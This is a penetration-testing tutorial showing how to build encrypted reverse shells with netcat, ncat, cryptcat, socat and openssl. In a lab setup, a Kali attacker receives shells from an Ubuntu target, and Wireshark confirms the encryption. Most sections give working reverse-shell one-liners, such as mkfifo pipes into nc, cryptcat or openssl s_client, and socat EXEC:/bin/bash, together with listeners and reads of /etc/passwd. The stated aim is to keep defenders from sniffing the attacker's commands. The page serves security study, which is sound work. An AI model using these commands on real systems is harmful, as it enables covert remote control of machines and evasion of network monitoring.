<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Encrypted Reverse Shell for Pentester</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/encrypted-reverse-shell-for-pentester/" rel="bookmark"><time class="entry-date published" datetime="2021-04-05T10:05:55+00:00">April 5, 2021</time><time class="updated" datetime="2025-05-30T13:41:30+00:00">May 30, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">Reverse shell that is generally used in the wild are prone to sniffing attacks as the communication that happens between the attacker and the victim machine is clear text-based communication. This creates an issue as if the Security Administrators that are responsible for the protection of the Victim System and Network can not only see the commands that are run on the Victim but also see the output that is displayed to the attacker. This can help them formulate a plan to counter the attack and understand the threat actor. This leaves the attacker in a vulnerable position. Hence, today we are going to test a bunch of tools and their ability to encrypt the reverse shell communication.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Contents</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;">Introduction</span>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">What is Reverse Shell?</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">What is Encrypted Shell?</span></li>
</ul>
</li>
<li class="ai-optimize-11"><span style="color: #000000;">VM Configurations</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Netcat Reverse Shell</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Ncat Reverse Shell</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Cryptcat Reverse Shell</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Socat Reverse Shell</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Openssl Reverse Shell</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Conclusion</span></li>
</ul>
<h3 class="ai-optimize-18"><span style="color: #800000;">Introduction</span></h3>
<p class="ai-optimize-19"><span style="color: #000000;"><strong>What is a Reverse Shell?</strong></span></p>
<p class="ai-optimize-20"><span style="color: #000000;">Reverse Shell is one of the terminologies that we and other people in our industry use very frequently but when it comes to defining it. That’s where we go on to provide examples to explain what we mean when we say reverse shell. But the question remains What is a reverse shell? Reverse Shell is when one machine connects to another machine but the initiating machine forwards its shell to the destination machine. Reverse Shell is mostly seen in the Penetration Testing Environment. If ever seen outside that environment, that means an attack of some sort is in motion. The reason reverse shell should be taken very seriously is that it provides the attacker with an interactive shell on a machine which they can then use to mount an attack of their choice. Gaining the Reverse Shell can be termed as Getting Initial Foothold.</span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><strong>What is an Encrypted Shell?</strong></span></p>
<p class="ai-optimize-22"><span style="color: #000000;">Encrypted shells, as the name recommends, encrypt the communication, in this manner denying middle person sniffers to unravel what we are attempting to achieve on the target machine.</span></p>
<h3 class="ai-optimize-23"><span style="color: #800000;">VM Configurations</span></h3>
<p class="ai-optimize-24"><span style="color: #000000;">In order to gain a reverse shell and use it to demonstrate, we will be using two machines. Kali Linux will pose as an attacker machine and Ubuntu will pose as a target machine. Default user on Ubuntu machine is raj.</span></p>
<p class="ai-optimize-25"><span style="color: #000000;">Kali Linux:            IP Address: 192.168.1.5</span></p>
<p class="ai-optimize-26"><span style="color: #000000;">Ubuntu:               IP Address: 192.168.1.2</span></p>
<h3 class="ai-optimize-27"><span style="color: #800000;">Netcat Reverse Shell</span></h3>
<p class="ai-optimize-28"><span style="color: #000000;">To begin, let’s understand the netcat (nc). It is a networking utility for reading from and writing to network connections using TCP or UDP. It is a feature-rich network debugging and investigation tool. Netcat can produce any kind of connection its user could need and has a number of built-in capabilities. But the reverse shell that is created using the netcat can be subjected to sniffing using Wireshark. This is due to the lack of encryption on it. As we are going to look at multiple reverse shell that are encrypted, let’s first look at the one which is not encrypted. To do this we will be using a one liner to create a reverse shell on our Ubuntu Device.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.5 1234 &gt;/tmp/f</pre>
<p class="ai-optimize-29"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wZq3os5F9Rs/YGrdH1l4cOI/AAAAAAAAvNw/PRkmS-JksRU2Y7U8onevSSGbFFhP-iU-QCLcBGAsYHQ/s16000/1.png"/></span></p>
<p class="ai-optimize-30"><span style="color: #000000;">Before starting the reverse shell on Ubuntu, we need to start a listener which will capture the shell after invocation. As the shell invocation command is executed, we see that we have the reverse shell of ubuntu on our Kali Linux. Since, we ran the shell command as root user, the shell we got is of root user as well.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
id
whoami</pre>
<p class="ai-optimize-31"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4AlA0Pf7X_s/YGrdM3KcIPI/AAAAAAAAvN0/76HHAvNEUD03OC1fbhlAKb0_nl5TDqBvgCLcBGAsYHQ/s16000/2.png"/></span></p>
<p class="ai-optimize-32"><span style="color: #000000;">Now to the investigation, to perform the network sniffing, we ran the Wireshark. Then added a filter for the IP Address of Ubuntu. This gave us the packets that must have travelled from Ubuntu to Kali. When we established the connection and when we ran the commands id and whoami. Choosing a stream from the captured traffic, we choose one and follow its TCP stream. This shows us the commands that ran and the output of that command. This means that the data can be sniffed by anyone on the network. In real life scenario, this could potentially leak credentials as those would travel in clear text as well. And some potential command</span></p>
<p class="ai-optimize-33"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2H_v1tk3yWs/YGrdRFz36UI/AAAAAAAAvN4/mN9DDN7rwIs_MiKZULKbRIqho4xlWn2lwCLcBGAsYHQ/s16000/3.png"/></span></p>
<h3 class="ai-optimize-34"><span style="color: #800000;">Ncat Shell Reverse Shell</span></h3>
<p class="ai-optimize-35"><span style="color: #000000;">Time to move onto a bit modern approach than netcat. Ncat was developed based on the idea of netcat but it is not made on the same code. It uses both TCP and UDP for communication and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses. Among these uses, today we will be focusing on the ability of ncat to encrypt the reverse shell to prevent sniffing. Since our Ubuntu doesn’t have the ncat installed, we can do it with the help of apt install.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install ncat</pre>
<p class="ai-optimize-36"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UmYysNFXDVU/YGrdVvtadTI/AAAAAAAAvN8/_EL1BFh6OCYr3vdjumxckpkpt9eQ-eIPwCLcBGAsYHQ/s16000/4.png"/></span></p>
<h4 class="ai-optimize-84"><span style="color: #000000;">Establishing an Encrypted Reverse Shell with Ncat</span></h4>
<p class="ai-optimize-37"><span style="color: #000000;">Now, as we did earlier with the ncat, we will try to invoke a reverse shell. The syntax for the ncat is simple. We provide the IP Address we want to connect to, followed by the port. Here we are demonstrating a method to encrypt shell; hence we are using the –ssl parameter. Then we give the -e /bin/bash in order to invoke a reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ncat 192.168.1.5 443 --ssl -e /bin/bash -v</pre>
<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wKJWZCCeWs4/YGrdbxF8YLI/AAAAAAAAvOE/S4DP08m9srYilom_ab-HIS5Js2_bFxa1ACLcBGAsYHQ/s16000/5.png"/></span></p>
<p class="ai-optimize-39"><span style="color: #000000;">Before executing the command on Ubuntu, start a ncat listener on Kali Linux. The listener is also supposed to have the -ssl argument in order to maintain the encryption.  After we have received the shell from our Ubuntu machine, we ran some command to generate traffic into our Wireshark.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ncat -l 443 --ssl -v
id</pre>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u79Qvi-B_g4/YGrdmtlw9dI/AAAAAAAAvOQ/wZ0nrahYPAsiOsgcsNclYQGYiMbWjAHnACLcBGAsYHQ/s16000/6.png"/></span></p>
<h4 class="ai-optimize-85"><span style="color: #000000;">Verifying Encryption with Wireshark</span></h4>
<p class="ai-optimize-41"><span style="color: #000000;">The Wireshark again captures the traffic between the Kali and Ubuntu. We use a ip.addr filter to sort the packets that might contain the command that is executed on Ubuntu through Kali Linux.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OkQkCJCbg1I/YGrd0koe-GI/AAAAAAAAvOY/wUuoLr0Cfn4LrP8O3c3RpYNcos4bxuQkQCLcBGAsYHQ/s16000/7.png"/></span></p>
<p class="ai-optimize-43"><span style="color: #000000;">We can see that the packets follow protocol TLSv1.3. This means that the communication is encrypted. To ensure that it is encrypted, we Follow the TCP Stream for those packets to see that the communication is unreadable as shown in the image below.</span></p>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eqhq2tYK3vg/YGrd5DAHEQI/AAAAAAAAvOg/2-XObdocV0o72WoCeWWsdjCgUVSKnJ6bwCLcBGAsYHQ/s16000/8.png"/></span></p>
<h3 class="ai-optimize-45"><span style="color: #800000;">Cryptcat Reverse Shell</span></h3>
<p class="ai-optimize-46"><span style="color: #000000;">CryptCat is a simple Unix utility that transmits encrypted data while reading and writing across network connections using the TCP or UDP protocol. Developers designed it to be a reliable “back-end” tool that users can employ directly or drive easily with other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool. Since it can create almost any kind of connection you would need and has several interesting built-in capabilities.</span></p>
<p class="ai-optimize-47"><span style="color: #000000;">Learn More: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/comprehensive-guide-on-cryptcat/">Comprehensive Guide on CryptCat</a></strong></span></span></p>
<p class="ai-optimize-48"><span style="color: #000000;">In CryptCat, we can protect our connection of chatting with a password and the password can be applied by using the [-k] parameter. We know that CryptCat provides us end to end encryption, but by using the [-k] parameter we can provide the extra layer of protection to our connection. So that it is almost impossible to decrypt our connection. We can apply for this protection with the following commands.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;">We use the same reverse shell one line that we used with netcat. But this time we used the cryptcat and we mentioned the key as secretkey.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|cryptcat 192.168.1.5 3333 -k secretkey &gt;/tmp/f</pre>
<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W3E2SwQ4amM/YGrd9wdoydI/AAAAAAAAvOk/QmBMQFMlG8EoQRriWfkFj67FZaIB7UROgCLcBGAsYHQ/s16000/9.png"/></span></p>
<p class="ai-optimize-51"><span style="color: #000000;">Now, the listener at the Kali Linux, we will need to provide the port and the secret key that we provided on Ubuntu. Again, we run a bunch of commands to create some traffic between the both machines.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cryptcat -lvp 3333 -k secretkey</pre>
<p class="ai-optimize-52"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v6VQuWwZ8-Q/YGreBeccH2I/AAAAAAAAvOo/xMTat_Rx1kc4vCh7Mhdw_I2mDSC_cihtwCLcBGAsYHQ/s16000/10.png"/></span></p>
<p class="ai-optimize-53"><span style="color: #000000;">Using Wireshark to capture the traffic between the two machines, we choose any one of the packets and choose the Follow the TCP Stream. The Steam shows us a bunch of random unreadable characters. This means that the communication performed using CryptCat is encrypted.</span></p>
<p class="ai-optimize-54"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p7V1a2AFRf8/YGreG2hN6XI/AAAAAAAAvOw/kKxyXDCbN5c-Dz1BTS16sZ164ZsHsU24QCLcBGAsYHQ/s16000/11.png"/></span></p>
<h3 class="ai-optimize-55"><span style="color: #800000;">Socat Shell Reverse Shell</span></h3>
<p class="ai-optimize-56"><span style="color: #000000;">Next, we are going to use Socat. But we cannot directly use socat to create an encrypted reverse shell. To do that, we will use openssl to create the certificate and key required to encrypt the communication. The syntax is quite simple, we start with the openssl and then the req argument. It will generate the certificate using the PKCS#10 X.509 Certificate Signing Request (CSR) Management. Followed by the encryption that we want to use. Then we eventually give the name of the key and -x509 describes the certificate signing request. It requires to tell the duration that we want the certificate to be active and then the subject of the certificate. The subject would ask for a link and Company Name.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl req -newkey rsa:2048 -nodes -keyout ignite.key -x509 -days 1000 -subj '/CN=www.ignite.lab/O=Ignite Tech./C=IN' -out ignite.crt</pre>
<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ybofg0IiLSs/YGreK0CPCDI/AAAAAAAAvO4/oP8HA2W1CisuzZnyb1WHiQvCmvB16A3_QCLcBGAsYHQ/s16000/12.png"/></span></p>
<p class="ai-optimize-58"><span style="color: #000000;">Running the Openssl command will create a certificate (ignite.crt) and a key (ignite.key). To encrypt the communication, we need a pem certificate. Conversion is simple, we use the cat command to read the contents of cert and keys and print in inside the pem file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat ignite.key ignite.crt &gt; ignite.pem</pre>
<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AODweGJM3SI/YGreOgCVRTI/AAAAAAAAvPA/MlktRLXpumAz9mfwT4BRgmLToo0Z4FO-ACLcBGAsYHQ/s16000/13.png"/></span></p>
<h4 class="ai-optimize-86"><span style="color: #000000;">Setting Up Encrypted Reverse Shell Using Socat</span></h4>
<p class="ai-optimize-60"><span style="color: #000000;">Now that we are ready to use Socat, Let’s learn a bit about it Socat is a network utility similar to netcat which supports ipv6, SSL and is available for both Windows and Linux. The first thing you will notice with this tool is that it employs a different syntax than what you are accustomed to with netcat or other standard Unix tools.</span></p>
<p class="ai-optimize-61"><span style="color: #000000;">In another word you can say it is a command-line based utility that inaugurates two bidirectional byte streams and transfers data between them. Because a large set of different types of data sinks and address types can build the streams.</span></p>
<p class="ai-optimize-62"><span style="color: #000000;">It is a utility for data transfer between two addresses which uses the syntax as “socat [options] &lt;address&gt;&lt;address&gt;”.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;">Learn More: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/linux-for-pentester-socat-privilege-escalation/">Linux For Pentester: socat Privilege Escalation</a></strong></span></span></p>
<p class="ai-optimize-64"><span style="color: #000000;">Now to start communication, we ran the listener on the Kali Linux providing the certificate and the port we need for communication.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat -d -d OPENSSL-LISTEN:4443,cert=ignite.pem,verify=0,fork STDOUT</pre>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-500BWzpifl0/YGreTmIEAII/AAAAAAAAvPI/ceDjiVHMsnsxivIon1blYgC3b8goV4jrQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p class="ai-optimize-66"><span style="color: #000000;">On the Ubuntu Machine, we run the socat with the IP Address of the Kali Linux with the same port as we described in the listener.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat OPENSSL:192.168.1.5:4443,verify=0 EXEC:/bin/bash</pre>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SpV0PjUC4BA/YGreXdP2-FI/AAAAAAAAvPM/ANJkZpCqEW4Z7iyAEBPWyuPYCXcS91SnQCLcBGAsYHQ/s16000/15.png"/></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">This created a reverse shell from the Ubuntu machine to the Kali Linux. We ran uname to confirm that our session is on an Ubuntu machine. We can also see the raj user in the /etc/passwd file as a user created on the Ubuntu machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uname -a
tail /etc/passwd</pre>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uIdDwMSQ2Eo/YGrebihKpxI/AAAAAAAAvPQ/39miUjhWJak-MaqPGBxdGtLMeoFw9c1sgCLcBGAsYHQ/s16000/16.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">It’s time to see if we succeeded in encrypting the data. Using Wireshark, we recorded the communication between the two workstations. To sort the packets, we included an IP address filter. We found some connection between the two. To view the contents of one of the packets, right-click on it and select Follow TCP Stream. We see that it contains full unintelligible bits, indicating that the two machines encrypt their communication and make it impervious to sniffers.</span></p>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_b_TUwMdJUc/YGrefpDj0RI/AAAAAAAAvPY/g1XwagXTQZYa5rsYQY7iwr_oV9CV7Lk5wCLcBGAsYHQ/s16000/17.png"/></span></p>
<h3 class="ai-optimize-72"><span style="color: #800000;">Openssl Reverse Shell</span></h3>
<p class="ai-optimize-73"><span style="color: #000000;">In the previous demonstration, we saw that we can create a certificate to encrypt the communication with the help of the Openssl command. But Openssl’s ability does not end there. It can also communicate between two machines or, as in our case, handle a reverse shell. We will encrypt the shell using the same pem file. On Kali Linux, we set up a listener on port 8080.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl s_server -quiet -key ignite.pem -cert ignite.pem -port 8080</pre>
<p class="ai-optimize-74"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FQcPrZWHK_0/YGrejzVbqUI/AAAAAAAAvPg/cBRAB5rb7u4sxbwyBf7rSEhM9q0luV4nQCLcBGAsYHQ/s16000/18.png"/></span></p>
<p class="ai-optimize-75"><span style="color: #000000;">We again use the same one line but this time we use Openssl client command to generate a shell and send the connection to port 8080.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|openssl s_client -quiet -connect 192.168.1.5:8080 &gt;/tmp/f</pre>
<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4tIRH4hayQI/YGren4ddpqI/AAAAAAAAvPk/ng4DJEbN04AqpgJMHJT7lwY47_TkfMzmgCLcBGAsYHQ/s16000/19.png"/></span></p>
<p class="ai-optimize-77"><span style="color: #000000;">As soon as we execute the command on Ubuntu, we get a shell on the Kali Linux. Again, to verify we read the /etc/passwd file to find the raj user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail /etc/passwd</pre>
<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dFiOWVCr6uU/YGrerrVybcI/AAAAAAAAvPs/dlQvM6xG_iEs2lgHKjsgjirz8DSIjzkdwCLcBGAsYHQ/s16000/20.png"/></span></p>
<p class="ai-optimize-79"><span style="color: #000000;">Moment of truth, to see if we can determine whether the communication or the reverse shell that we generate with the help of the pem certificate using Openssl is encrypted or not. To do this, we captured the traffic on Wireshark and followed the TCP stream. Our analysis shows that the communication is indeed encrypted.</span></p>
<p class="ai-optimize-80"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-omsL-0MLvbs/YGrewgGOkVI/AAAAAAAAvP0/kXJtRDbtJe4g5Jnk-4Nrr1u2JAnEamocACLcBGAsYHQ/s16000/21.png"/></span></p>
<h3 class="ai-optimize-81"><span style="color: #800000;">Conclusion</span></h3>
<p class="ai-optimize-82"><span style="color: #000000;">The motive of this article was to experiment with different networking tools to create some encrypted shells and test if the communication of the reverse shell activity is vulnerable to network sniffing or not. We covered some of the famous tools that are in this area, there might be some more as well. We leave it upon you to look for those and test their ability to encrypt the traffic.</span></p>
<p class="ai-optimize-83"><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
